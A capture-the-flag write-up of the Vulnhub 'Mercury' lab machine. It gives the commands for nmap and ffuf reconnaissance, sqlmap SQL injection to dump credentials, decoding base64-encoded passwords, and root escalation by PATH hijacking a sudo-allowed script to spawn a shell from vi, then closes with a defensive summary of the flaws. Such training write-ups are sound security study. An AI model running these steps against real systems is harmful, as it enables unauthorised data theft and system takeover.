# 📝 Pentesting Mercury Vulnhub

## 📌 General Information

- **Platform:** Vulnhub
- **Category/Series:** The Planets
- **Difficulty:** Easy
- **Author:**  SirFlash
- **Date release:** 4 Sep 2020

---

## ⚠️ Legal & Ethical Notice

This write‑up is for educational purposes only. Do **not** perform testing without explicit authorization.

---

## 🎯 Challenge Objective

 Mercury is an easier box, with no bruteforcing required. There are two flags on the box: a user and root flag which include an md5 hash.

---

## 🛠️ Environment Used

- Operating system: Kali Linux
- Tools used: nmap, sqlmap, ffuf
- Network: <br> -DHCP service: Enabled  
          -IP address: Automatically assign  

---

## 🔍 Methodology

### Theory

- Reconnaissance  
- Scanning & Enumeration  
- Exploitation  
- Post-Exploitation (if applicable)

### Practical

- Information gathering and network discovery  
- Service enumeration and vulnerability identification  
- Web application assessment  
- Database enumeration  
- Credential analysis and lateral movement  
- Privilege escalation and post-exploitation

---

## 🕵️‍♂️ Walkthrough

### 🔎 Reconnaissance

> If you don't know your ip go to the terminal and run: ``ip a`` <br>
![alt text](image.png)
We run nmap to see what's in our network: ``nmap -sn 192.168.239.0/24``
![alt text](image-1.png)

### 🧭 Scanning & Enumeration

The IP address of Mercury's virtual machine is ``192.168.239.5``
Now we scan the ip for open ports: ``nmap -sC -sV 192.168.239.5``
![alt text](image-3.png)
We can see that the port 8080 is open with the service HTTP so there could be a website running and the port 22 for SSH

### 🌐 Web Exploration & Content Discovery

We access the web service: ``http://192.168.239.5:8080/``
![alt text](image-4.png)
There could be hiden directories or files<br>
We will use ffuf to find hidden directories or files:``ffuf -u "http://192.168.239.5:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -t 50``
![alt text](image-5.png)
We found ``robots.txt``<br>
We access the directory:``http://192.168.239.5:8080/robots.txt``
![alt text](image-6.png)
We can see that there is an error page if we substitute ``robots.txt`` with a ``*``
![alt text](image-7.png)
There we can see that there is a directory named:``mercuryfacts``<br>
Now we access the directory:``http://192.168.239.5:8080/mercuryfacts``
![alt text](image-8.png)
When we open the first link there is just a fact about Mercury with a ID = 1
![alt text](image-9.png)<br>
When we open the second link there is a to-do list about the website giving us hints about the security of the website<br>
![alt text](image-10.png)<br>
We see that the web application could be vulnerable to SQLi <br>

### 🛡️ Vulnerability Identification

To confirm that the website is vulnerable to SQLi we go to the terminal and use sqlmap: ``sqlmap -u http://192.168.239.5:8080/mercuryfacts/``<br>
![alt text](image-11.png)<br>
The website is vulnerable to SQLi with these three types of SQL injection:<br>
![alt text](image-12.png)<br>
We want to know if we can gain access to the database:``sqlmap -u http://192.168.239.5:8080/mercuryfacts/ --dbs --batch``<br>
![alt text](image-13.png)<br>
We discovered two databases: ``information_schema``; ``mercury``<br>
Let's see what tables we have in ``mercury``
![alt text](image-14.png)<br>
![alt text](image-15.png)<br>
We have two tables for the data base mercury and one of them is the username & password<br>
We already know that this IP has an open port for the SSH service so now we are going to login to the ssh using these credentials<br>

### 🔑 User Access

SSH access was obtained using credentials stored in the application database:``ssh webmaster@192.168.239.5``<br>
![alt text](image-16.png)<br>
We successfully logged in now we list the content of that folder:``ls``<br>
![alt text](image-17.png)<br>
we can see the content of the file flag with this command: ``cat user_flag.txt``<br>
![alt text](image-18.png)<br>
Now to get root privileges we have to search deeper<br>
We have to change directories: ``cd mercury_proj``<br>
![alt text](image-19.png)<br>
There could be root information on the ``notes.txt`` we have to see what's inside: ``cat notes.txt``<br>
![alt text](image-20.png)<br>
There are encoded passwords we have to decode it using: ``echo 'bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK' | base64 -d`` and ``echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d``<br>
Now we have the password for ``webmaster`` and ``linuxmaster``<br>
![alt text](image-21.png)
![alt text](image-22.png)<br>

### ⬆️ Privilege Escalation

We can now log in with linuxmaster but first we open another terminal and then: ``ssh linuxmaster@192.168.239.5``<br>
![alt text](image-23.png)<br>
We can see the rights and privileges of this user with: ``sudo -l``
![alt text](image-24.png)<br>
First we have to see the content of ``usr/bin/check_syslog.sh`` with: ``cat /usr/bin/check_syslog.sh``
![alt text](image-25.png)<br>
Here we have a script that executes the tail program for reading the last 10 log entries <br>
We will create a link to a file or directory using the vi editor:``ln -s /usr/bin/vi tail``<br>
Now we have to export the local variable with this: ``export PATH=$(pwd):$PATH``<br>
we have to execute the file ``check_syslog.sh`` with: ``sudo --preserve-env=PATH /usr/bin/check_syslog.sh``<br>
It will open the ``check_syslog.sh`` in the vi editor<br>  
![alt text](image-26.png)  
![alt text](image-27.png)<br>  
In the vi editor we have to execute this line to have a shell: ``:!/bin/bash``<br>

Finally we change directory to the root: ``cd /root`<br>
![alt text](image-28.png)<br>

### 🏁 Objectives & Flags

Root privileges were successfully obtained<br>  
![alt text](image-29.png)

---

## 🛡️ Identified Vulnerabilities (Technical Description)

### 1. SQL Injection

- **Vulnerability name:** SQL Injection (Boolean/Union/Error-based)
- **Affected component:** Web application parameter handling in `mercuryfacts`
- **Brief description (no exploitation details):**  
  The application uses unvalidated user input directly in SQL queries without proper sanitization or use of prepared statements.
- **Potential impact:**  
  Unauthorized access to database contents, disclosure of sensitive information, extraction of credentials.

---

### 2. Insecure Credential Storage

- **Vulnerability name:** Weakly encoded credentials (Base64)
- **Affected component:** Local files containing notes and application data
- **Brief description (no exploitation details):**  
  Passwords were stored using reversible encoding rather than cryptographically secure hashing.
- **Potential impact:**  
  Attackers may recover plaintext passwords and reuse them across system services.

---

### 3. Credential Reuse

- **Vulnerability name:** Reuse of system credentials
- **Affected component:** SSH and local user accounts
- **Brief description (no exploitation details):**  
  The same or related credentials were used across multiple services and accounts.
- **Potential impact:**  
  Compromise of a single service leads to broader compromise of the entire system.

---

### 4. Misconfigured Sudo Permissions

- **Vulnerability name:** Overly permissive sudo rule
- **Affected component:** `/usr/bin/check_syslog.sh`
- **Brief description (no exploitation details):**  
  A regular user was allowed to execute a root-owned script without password and without proper command restrictions.
- **Potential impact:**  
  Privilege escalation from standard user to root.

---

### 5. PATH Hijacking in Privileged Script

- **Vulnerability name:** PATH environment variable manipulation
- **Affected component:** System script calling binaries without absolute paths
- **Brief description (no exploitation details):**  
  The script executed system binaries using relative names, trusting the user-controlled PATH variable.
- **Potential impact:**  
  Execution of unintended binaries with elevated privileges.

---

## ❌ Common Mistakes

- **Exposed development files:** Leaving files such as `robots.txt`, TODO lists, or debug pages publicly accessible can reveal sensitive directories and implementation details.
- **Lack of input validation:** Failing to properly validate and sanitize user input can lead to vulnerabilities such as **SQL Injection**.
- **Storing credentials insecurely:** Saving passwords in plaintext or weakly encoded formats (e.g., Base64) instead of using strong hashing algorithms exposes systems to easy credential compromise.
- **Credential reuse:** Reusing the same credentials across multiple services (web application, SSH, system users) significantly increases the impact of a breach.
- **Over-permissive sudo rules:** Allowing users to execute scripts as root without strict restrictions can lead to privilege escalation.
- **Using relative paths in scripts:** Calling binaries like `tail` without absolute paths in privileged scripts makes them vulnerable to **PATH hijacking** attacks.
- **Insufficient privilege separation:** Users having more permissions than necessary violates the **principle of least privilege** and increases attack surface.
- **Lack of security monitoring:** Absence of logging, alerting, or intrusion detection makes it harder to detect and respond to exploitation attempts.

---

## ✅ What I Learned

- How to perform effective network reconnaissance using **Nmap** to identify live hosts, open ports, and running services.
- The importance of **directory and file enumeration** in web applications, and how files like `robots.txt` can unintentionally expose sensitive paths.
- How to identify and exploit **SQL Injection vulnerabilities** using **sqlmap** to enumerate databases, tables, and extract credentials.
- The risks of **storing plaintext or weakly encoded credentials** (e.g., Base64), which can be easily decoded and reused.
- How credential reuse across services (web application → SSH) can lead to **full system compromise**.
- How misconfigured **sudo permissions** combined with **PATH environment variable manipulation** can be abused for **privilege escalation**.
- Practical experience with **Linux privilege escalation techniques**, including abusing scripts that call binaries without absolute paths.
- The importance of applying the **principle of least privilege** and properly securing scripts executed with elevated permissions.

---

## 📎Useful Links

- CWE:https://cwe.mitre.org/
